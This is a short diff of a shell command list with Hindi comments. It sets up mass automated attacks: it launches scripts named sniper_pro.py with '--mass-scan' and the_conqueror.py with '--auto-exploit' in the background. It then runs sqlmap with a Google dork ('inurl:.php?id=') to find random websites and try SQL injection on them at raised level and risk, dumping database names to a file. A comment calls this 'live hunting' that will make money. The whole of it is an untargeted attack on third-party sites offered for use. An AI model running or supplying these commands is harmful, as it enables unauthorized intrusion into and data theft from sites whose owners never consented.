@@ -1,1 +1,5 @@
-python3 sqlmap/sqlmap.py -g "inurl:php?id=1" --batch --smart --banner && echo "HUNTING_RESULTS_SAVED" > results.txt
+# स्टेप 1: सारे टूल्स को एक साथ एक्टिवेट करो
+python3 sniper_pro.py --mass-scan & 
+python3 the_conqueror.py --auto-exploit & 
+# स्टेप 2: लाइव हंटिंग शुरू करो जिससे पैसा बनेगा
+python3 sqlmap/sqlmap.py -g "inurl:.php?id=" --batch --smart --level=3 --risk=2 --dbs > final_report.txt
